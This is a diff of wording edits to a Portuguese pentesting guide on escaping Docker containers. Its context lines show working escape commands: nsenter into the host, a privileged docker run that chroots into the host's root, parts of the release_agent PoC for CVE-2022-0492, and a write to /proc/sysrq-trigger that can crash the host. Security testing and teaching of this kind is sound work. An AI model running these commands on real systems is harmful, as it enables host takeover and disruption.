@@ -34,7 +34,7 @@ nsenter --target 1 --mount --uts --ipc --net --pid -- bash
 docker run -it -v /:/host/ --cap-add=ALL --security-opt apparmor=unconfined --security-opt seccomp=unconfined --security-opt label:disable --pid=host --userns=host --uts=host --cgroupns=host ubuntu chroot /host/ bash
 ```
 > [!NOTE]
-> Caso o **docker socket esteja em um local inesperado**, você ainda pode se comunicar com ele usando o comando **`docker`** com o parâmetro **`-H unix:///path/to/docker.sock`**
+> Caso o **docker socket esteja em um lugar inesperado**, você ainda pode se comunicar com ele usando o comando **`docker`** com o parâmetro **`-H unix:///path/to/docker.sock`**
 
 O daemon do Docker também pode estar [ouvindo em uma porta (por padrão 2375, 2376)](../../../../network-services-pentesting/2375-pentesting-docker.md) ou em sistemas baseados em Systemd, a comunicação com o daemon do Docker pode ocorrer através do socket do Systemd `fd://`.
 
@@ -50,7 +50,7 @@ O daemon do Docker também pode estar [ouvindo em uma porta (por padrão 2375, 2
 
 ## Abuso de Capacidades para Escapar
 
-Você deve verificar as capacidades do contêiner; se ele tiver alguma das seguintes, você pode ser capaz de escapar dele: **`CAP_SYS_ADMIN`**_,_ **`CAP_SYS_PTRACE`**, **`CAP_SYS_MODULE`**, **`DAC_READ_SEARCH`**, **`DAC_OVERRIDE, CAP_SYS_RAWIO`, `CAP_SYSLOG`, `CAP_NET_RAW`, `CAP_NET_ADMIN`**
+Você deve verificar as capacidades do contêiner, se ele tiver alguma das seguintes, você pode ser capaz de escapar dele: **`CAP_SYS_ADMIN`**_,_ **`CAP_SYS_PTRACE`**, **`CAP_SYS_MODULE`**, **`DAC_READ_SEARCH`**, **`DAC_OVERRIDE, CAP_SYS_RAWIO`, `CAP_SYSLOG`, `CAP_NET_RAW`, `CAP_NET_ADMIN`**
 
 Você pode verificar as capacidades atuais do contêiner usando **ferramentas automáticas mencionadas anteriormente** ou:
 ```bash
@@ -113,7 +113,7 @@ E voilà! Agora você pode acessar o sistema de arquivos do host porque ele est�
 
 #### Montando Disco - Poc2
 
-Dentro do contêiner, um atacante pode tentar obter mais acesso ao sistema operacional subjacente do host por meio de um volume hostPath gravável criado pelo cluster. Abaixo estão algumas coisas comuns que você pode verificar dentro do contêiner para ver se você pode aproveitar esse vetor de ataque:
+Dentro do contêiner, um atacante pode tentar obter mais acesso ao sistema operacional subjacente do host por meio de um volume hostPath gravável criado pelo cluster. Abaixo estão algumas coisas comuns que você pode verificar dentro do contêiner para ver se pode aproveitar esse vetor de ataque:
 ```bash
 ### Check if You Can Write to a File-system
 echo 1 > /proc/sysrq-trigger
@@ -168,7 +168,7 @@ sh -c "echo 0 > $d/w/cgroup.procs"; sleep 1
 # Reads the output
 cat /o
 ```
-#### Escalada de Privilégios Abusando do release_agent criado ([cve-2022-0492](https://unit42.paloaltonetworks.com/cve-2022-0492-cgroups/)) - PoC2
+#### Escapando de Privilégios Abusando do release_agent criado ([cve-2022-0492](https://unit42.paloaltonetworks.com/cve-2022-0492-cgroups/)) - PoC2
 ```bash:Second PoC
 # On the host
 docker run --rm -it --cap-add=SYS_ADMIN --security-opt apparmor=unconfined ubuntu bash
@@ -351,7 +351,7 @@ Com tal capacidade, o usuário root dentro do contêiner é permitido **criar ar
 
 O Docker protege contra o uso indevido de dispositivos de bloco dentro de contêineres, aplicando uma política de cgroup que **bloqueia operações de leitura/gravação de dispositivos de bloco**. No entanto, se um dispositivo de bloco for **criado dentro do contêiner**, ele se torna acessível de fora do contêiner através do diretório **/proc/PID/root/**. Esse acesso requer que o **proprietário do processo seja o mesmo** tanto dentro quanto fora do contêiner.
 
-Exemplo de **Exploração** deste [**writeup**](https://radboudinstituteof.pwning.nl/posts/htbunictfquals2021/goodgames/):
+Exemplo de **exploração** deste [**writeup**](https://radboudinstituteof.pwning.nl/posts/htbunictfquals2021/goodgames/):
 ```bash
 # On the container as root
 cd /
@@ -438,7 +438,7 @@ Você também poderá acessar **serviços de rede vinculados ao localhost** dent
 ```bash
 docker run --rm -it --ipc=host ubuntu bash
 ```
-Com `hostIPC=true`, você ganha acesso aos recursos de comunicação entre processos (IPC) do host, como **memória compartilhada** em `/dev/shm`. Isso permite leitura/escrita onde os mesmos recursos IPC são usados por outros processos do host ou pod. Use `ipcs` para inspecionar esses mecanismos IPC mais a fundo.
+Com `hostIPC=true`, você ganha acesso aos recursos de comunicação entre processos (IPC) do host, como **memória compartilhada** em `/dev/shm`. Isso permite leitura/escrita onde os mesmos recursos IPC são usados por outros processos do host ou do pod. Use `ipcs` para inspecionar esses mecanismos IPC mais a fundo.
 
 - **Inspecionar /dev/shm** - Procure por quaisquer arquivos nesta localização de memória compartilhada: `ls -la /dev/shm`
 - **Inspecionar instalações IPC existentes** – Você pode verificar se alguma instalação IPC está sendo usada com `/usr/bin/ipcs`. Verifique com: `ipcs -a`
